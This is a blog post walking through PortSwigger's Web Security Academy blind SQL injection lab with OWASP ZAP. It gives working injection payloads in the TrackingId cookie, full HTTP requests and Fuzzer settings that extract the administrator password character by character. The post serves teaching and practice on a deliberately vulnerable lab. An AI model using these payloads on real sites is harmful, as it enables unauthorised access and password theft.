<!DOCTYPE html>
<html lang="en">

    <head><title>Exploiting Blind SQLi by Triggering Conditional Responses with OWASP ZAP &ndash; Chaotic Solutions</title>
<meta name="description" content="A blog about things that can be used, by people.">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="http://kurobeats.github.io/css/palettes/dracula.css">
<link rel="stylesheet" href="http://kurobeats.github.io/css/risotto.css">
<link rel="stylesheet" href="http://kurobeats.github.io/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><nav class="page__nav main-nav">
    <ul>
    <h1 class="page__logo"><a href="http://kurobeats.github.io/" class="page__logo-inner">Chaotic Solutions</a></h1>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://kurobeats.github.io/posts/" title="">Posts</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <header class="content__header">
        <h1>Exploiting Blind SQLi by Triggering Conditional Responses with OWASP ZAP</h1>
    </header>
    
    <div class="content__body">
        <p><em>Note:</em> This was part of an overall effort to complete PortSwigger&rsquo;s Web Security Academy without Burp Suite.</p>
<p>An application that utilises tracking cookies for collecting usage analytics requires requests to include a cookie header similar to the following:</p>
<p><code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>When a request containing a TrackingId cookie is being handled, the application uses an SQL query to check whether the user is a recognised user. The query used is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> TrackingId <span style="color:#66d9ef">FROM</span> TrackedUsers <span style="color:#66d9ef">WHERE</span> TrackingId <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;u5YD3PapBcR4lN3e7Tj4&#39;</span>
</span></span></code></pre></div><p>Although the query does not return any data to the user, it is susceptible to SQL injection. The application behaves differently based on whether the query returns any data. If the query does return data (because the submitted TrackingId is recognised), a &ldquo;Welcome back&rdquo; message is displayed on the page.</p>
<p>This behavior makes it possible to exploit the blind SQL injection vulnerability and extract information by conditionally triggering different responses based on an injected condition. To illustrate this, let&rsquo;s assume that two requests are sent consecutively, each containing a TrackingId cookie with the following values:</p>
<p><em>Note:</em> for the sake of simplicity, we assume that the initial value of the cookie is <code>TrackingId=xyz</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">…</span>xyz<span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">…</span>xyz<span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>The initial value will trigger the query to produce results as the injected condition <code>AND '1'='1</code> is true. This results in the display of the &ldquo;Welcome back&rdquo; message. However, the second value will not produce any results as the injected condition is false. Consequently, the &ldquo;Welcome back&rdquo; message will not be displayed. By determining the answer to a single injected condition, we can gradually extract data one bit at a time.</p>
<p>Let&rsquo;s say there is a table named <code>Users</code> that includes columns named <code>Username</code> and <code>Password</code>, which includes a user known as <code>Administrator</code>. We can determine the password for this user by sending a series of inputs to test the password one character at a time.</p>
<p>To begin, we can use the following input:</p>
<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'm</code></p>
<p><img src="/img/a4c7504fb8bfbe0cf4e5721e5d9d20ea.png" alt="a4c7504fb8bfbe0cf4e5721e5d9d20ea.png"></p>
<p>This produces the &ldquo;Welcome back&rdquo; message, indicating that the first character of the password is greater than <code>m</code>, as the injected condition is true.</p>
<p>We then send the following input:</p>
<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 't</code></p>
<p>This does not return the &ldquo;Welcome back&rdquo; message, indicating that the injected condition is false, and hence the first character of the password is not greater than <code>t</code>.</p>
<p>We can continue sending similar inputs until we obtain the full password for the <code>Administrator</code> user. For example, the following input confirms that the first character of the password is <code>s</code>:</p>
<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'</code></p>
<p><em>Note:</em> Some types of database use <code>SUBSTR</code> instead of <code>SUBSTRING</code>.</p>
<p>To modify the request containing the <code>TrackingId</code> cookie, go to the front page of the shop and use a web proxy. Change the <code>TrackingId</code> cookie to:</p>
<p><code>TrackingId=xyz' AND '1'='1</code></p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR&#39; AND &#39;1&#39;=&#39;1; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>Confirm that the response displays the &ldquo;Welcome back&rdquo; message. Then modify it to:</p>
<p><code>TrackingId=xyz' AND '1'='2</code></p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR&#39; AND &#39;1&#39;=&#39;2; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>Ensure that the response does not exhibit the &ldquo;Welcome back&rdquo; message. This illustrates how you can examine a single boolean condition and deduce the outcome. Then modify it to:</p>
<p><code>TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code></p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>Verify that the condition is true, which confirms the existence of a table named &ldquo;users&rdquo;.</p>
<p><img src="/img/8c2c3d56207129ad15e19a3bea4e0227.png" alt="8c2c3d56207129ad15e19a3bea4e0227.png"></p>
<p>Now change it to:</p>
<p><code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>Verify that the condition is true, confirming that there is a user called administrator.</p>
<p><img src="/img/6259afb90098477d74bb986e753a5e87.png" alt="6259afb90098477d74bb986e753a5e87.png"></p>
<p>To determine the length of the password of the administrator user, modify the value to:</p>
<p><code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a</code></p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;1)=&#39;a; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>This condition should be true, confirming that the password is greater than 1 character in length.</p>
<p><img src="/img/eb7cc0fc6c0f2311ba6818cc8021fd5c.png" alt="eb7cc0fc6c0f2311ba6818cc8021fd5c.png"></p>
<p>Send a series of follow-up values to test different password lengths. Send:</p>
<p><code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;2)='a</code></p>
<p>Then send:</p>
<p><code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a</code></p>
<p>Repeat this process to determine the password&rsquo;s length manually using ZAP&rsquo;s Manual Request Editor, as the length is presumably short. Once the condition is no longer valid (i.e., the &ldquo;Welcome back&rdquo; message vanishes), the password length, which is 20 characters long, is established.</p>
<pre tabindex="0"><code>GET https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://acc21f2c1e7c6c578017078200f3009b.web-security-academy.net/filter?category=Gifts
Cookie: TrackingId=ttA5PuFVqBx32BKR&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)=20)=&#39;a; session=IOnCeWQ4D8oa7OTRWL5c1osLrStRH4CV
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: acc21f2c1e7c6c578017078200f3009b.web-security-academy.net
</code></pre><p>Once the password length has been determined, the subsequent step is to test each character in the password to find its value. This process involves a significantly larger number of requests, necessitating the use of ZAP&rsquo;s Fuzzer. To begin with, we must create a request that we can fuzz. To do so, we use ZAP&rsquo;s Manual Request Editor and create a request with the following:</p>
<p><code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></p>
<p><img src="/img/e13dcc9b89e735d06dbcc05dee02538f.png" alt="e13dcc9b89e735d06dbcc05dee02538f.png"></p>
<p>This uses the <code>SUBSTRING()</code> function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.</p>
<p>From the same windows, highlight the <code>a</code>, right click and send the request to ZAP&rsquo;s Fuzzer, using the context menu.</p>
<p><img src="/img/10ccc9894be46037a273ead992439900.png" alt="10ccc9894be46037a273ead992439900.png"></p>
<p>Make sure the <code>a</code> is highlights in the Fuzzer window:</p>
<p><img src="/img/a2c905aeb9370f15dfdd5a22c72b8b8b.png" alt="a2c905aeb9370f15dfdd5a22c72b8b8b.png"></p>
<p>To test the character at each position, you&rsquo;ll need to send suitable payloads in the payload position that you&rsquo;ve defined. You can assume that the password contains only lowercase alphanumeric characters. Click the Payloads&hellip; button, click Add&hellip;, select Numberzz and click Add:</p>
<p><img src="/img/8df79e2b57fff1b245291b092652f2f8.png" alt="8df79e2b57fff1b245291b092652f2f8.png"></p>
<p>Click Add&hellip;, select Strings, enter all letters, lowercase and click Add:</p>
<p><img src="/img/592304fbf03445ddb694c09483a88346.png" alt="592304fbf03445ddb694c09483a88346.png"></p>
<p>To be able to tell when the correct character was submitted, you&rsquo;ll need to grep each response for the expression &ldquo;Welcome back&rdquo;. To do this, go to the Message Processors tab, click Add&hellip;, select &ldquo;Tag Creator&rdquo;, select &ldquo;Match&rdquo; enter the regex <code>.*Welcome back.*</code> and the Tag to <code>true</code> and click Add.</p>
<p><img src="/img/64288331ad96fa96e5e0dc6422d146c4.png" alt="64288331ad96fa96e5e0dc6422d146c4.png"></p>
<p>Click the &ldquo;Start attack&rdquo; button or select &ldquo;Start Fuzzer&rdquo; from the Fuzzer window to launch the attack. Review the attack results to determine the value of the character at the first position. Look for a row in the results with a <code>true</code> tag in the &ldquo;State&rdquo; column, and the corresponding payload is the value of the first character, which is <code>1</code>.</p>
<p>To determine the values of the remaining characters, you need to re-run the attack for each offset in the password. In the main ZAP window, go to the Positions tab of the Fuzzer and change the specified offset from 1 to 2. The cookie value should be modified as follows:</p>
<p><code>TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a</code></p>
<p>Launch the modified attack, review the results, and note the character at the second offset. Repeat this process for offsets 3, 4, and so on until you obtain the entire password.</p>
<p>To speed up the process for a 20-character password, add an additional payload to the request consisting of numbers 1-20, highlighted in green:</p>
<p><img src="/img/0d0a9015e3f52d3b3a98bccc3021d468.png" alt="0d0a9015e3f52d3b3a98bccc3021d468.png"></p>
<p>Once you have added the Tag Creator in the Message Processors tab, you can begin the attack by clicking the &ldquo;Start Fuzzer&rdquo; button. As the fuzzing process runs, you can watch as the password is gradually revealed character by character.</p>
<p>To use the discovered password, open the login page by clicking &ldquo;My account&rdquo; in your browser, and enter the password to log in as the <code>administrator</code> user. The password for the <code>administrator</code> user was found to be <code>143rm9xrf2frjy31kabo</code>.</p>

    </div>
    <footer class="content__footer"></footer>

            </section>

            <section class="page__aside">
                <div class="aside__about">
<div class="aside__about">
    <img class="about__logo" src="http://kurobeats.github.io/img/favicon.png" alt="Logo">
<h1 class="about__title">Chaotic Solutions</h1>
<p class="about__description">A blog about things that can be used, by people.</p>
</div>


<ul class="aside__social-links">
    
    <li>
        <a href="https://github.com/kurobeats" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="https://discordapp.com/users/218920799967510529" rel="me" aria-label="Discord" title="Discord"><i class="fa-brands fa-discord" aria-hidden="true"></i></a>&nbsp;
    </li>
    
    <li>
        <a href="https://au.linkedin.com/in/acozamanis" rel="me" aria-label="LinkedIn" title="LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
    </li>
    
</ul>
</div>
                <hr>
                <div class="aside__content">
    <p>This post is about exploiting blind SQL injection by triggering conditional responses.</p>
    
        <p>
            By Anthony Cozamanis, 
            2023-05-13
        </p>
    

    

                </div>
            </section>

            <footer class="page__footer"><p>
    
    
    
    
    
    
      
    
    
    
</p>
<br /><br />
<p class="copyright">Anthony Cozamanis (CC BY 4.0)</p>
<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
</footer>

        </div>
    </body>

</html>
